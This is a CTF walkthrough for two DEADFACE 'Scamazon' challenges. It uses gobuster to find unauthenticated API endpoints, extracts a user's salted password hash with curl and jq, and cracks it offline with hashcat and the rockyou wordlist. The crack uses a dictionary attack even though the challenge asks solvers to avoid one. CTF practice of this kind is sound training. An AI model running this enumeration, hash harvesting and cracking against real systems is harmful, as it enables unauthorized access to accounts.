# Scamazon

## Scamazon 1 

Created by: **syyntax**

DEADFACE is running a scam e-commerce website they’re using to target TGRI and Lytton Labs employees. The site consists of products that these companies frequently purchase. Based on Ghost Town, it looks like lilith built the site. She’s not known for her programming skills - maybe she left a flaw in the website’s design.

Find the flag associated with  `scamazon 1`. Submit the flag as  `flag{flag_text}`.

[https://epicsales.deadface.io](https://epicsales.deadface.io/)

_**Password bruteforcing is off limits for this challenge**_

### Solution

Go to [Ghost Town](https://ghosttown.deadface.io), search `api`, find [post](https://ghosttown.deadface.io/t/scam-azon-site-needed/124/10)

> Idk how good you are with APIs but it might be a good idea to include one so we have easy access in JSON format to the data our victims provide.

```bash
└─$ gobuster dir -u https://epicsales.deadface.io/ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://epicsales.deadface.io/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/api/v2/public/feeds.json (Status: 200) [Size: 105]
/api/v2/users         (Status: 200) [Size: 225508]
Progress: 268 / 269 (99.63%)
===============================================================
Finished
===============================================================

└─$ curl https://epicsales.deadface.io/api/v2/public/feeds.json
{
  "flags": [
    {
      "name": "scamazon 1",
      "value": "flag{w34K_aPi_p3rMISs1oNS}"
    }
  ]
}
```
::: tip Flag
`flag{w34K_aPi_p3rMISs1oNS}`
:::

## Scamazon 2

Created by: **syyntax**

Try to find a way to access the EpicSales site. You’ll need to figure out  `lilith`’s password though. We don’t want to make too much noise, so avoid using dictionary attacks if possible. 

## Solution

From previous challenge we know that api has users endpoint which returns json, and it also has passwords.

```bash
└─$ curl https://epicsales.deadface.io/api/v2/users -s | jq '.users[] | select(.email | test("lilith.*"))'
{
  "email": "lilith@deadface.io",
  "first_name": "Vanessa",
  "last_name": "Ludi",
  "password": "sha256$Hsc1Qq4IGJtt2JkU$793e66d5522bed63f71749245401705b49099af922d256b1040ff499a5ac9cb9"
}
```

Lets crack the password

```bash
└─$ echo -n 'sha256$Hsc1Qq4IGJtt2JkU$793e66d5522bed63f71749245401705b49099af922d256b1040ff499a5ac9cb9' > lilith.hash 
                                                                                           
└─$ hashcat --show lilith.hash # Find hash type
...
30120 | Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt)) | Framework
...

└─$ hashcat -m 30120 -a 0 lilith.hash $rockyou
Status...........: Cracked
...

└─$ hashcat --show lilith.hash                
...
sha256$Hsc1Qq4IGJtt2JkU$793e66d5522bed63f71749245401705b49099af922d256b1040ff499a5ac9cb9:1234567890
```
::: tip Flag
`flag{1234567890}`
:::